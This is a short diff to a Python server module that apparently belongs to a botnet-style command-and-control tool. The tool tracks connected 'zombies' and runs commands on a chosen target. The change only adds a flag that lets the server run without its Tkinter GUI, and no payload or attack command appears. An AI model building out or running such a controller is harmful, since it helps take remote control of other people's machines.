@@ -15,7 +15,7 @@ from PIL import Image, ImageTk
 from time import sleep
 
 class ServerModule:
-    def __init__(self, lip, lport, zombies_gui_tab):
+    def __init__(self, lip, lport, zombies_gui_tab ,is_from_gui):
         self.listening_ip = lip
         self.listening_port = lport
         self.connection_status = 0
@@ -24,6 +24,7 @@ class ServerModule:
         self.default_target = None # this var saves default target for executing commands when -h option is not used
         self.terminal_window_box = None
         self.zombies_gui_tab = zombies_gui_tab
+        self.is_from_gui = is_from_gui
 
     def start_server(self):
         try:
@@ -117,10 +118,13 @@ class ServerModule:
         else:
             terminal = Terminal(terminal_window_box=terminal_window_box, command=command,
                                 zombies_addresses_and_communicators_list=self.zombies_addresses_and_communicators_list,
-                                default_target=self.default_target)
+                                default_target=self.default_target,
+                                is_from_gui=True)
             Thread(target=terminal.interpret_command).start()
 
     def update_zombies_tab(self):
+        if not self.is_from_gui:
+            return
         while True:
             if not self.connection_status:
                 break
@@ -148,6 +152,8 @@ class ServerModule:
             sleep(1)
 
     def push_text_in_terminal_box(self, text):
+        if not self.is_from_gui:
+            return
         text = text.strip() + '\n'
         self.terminal_window_box.config(state='normal')
         self.terminal_window_box.insert(END, text)
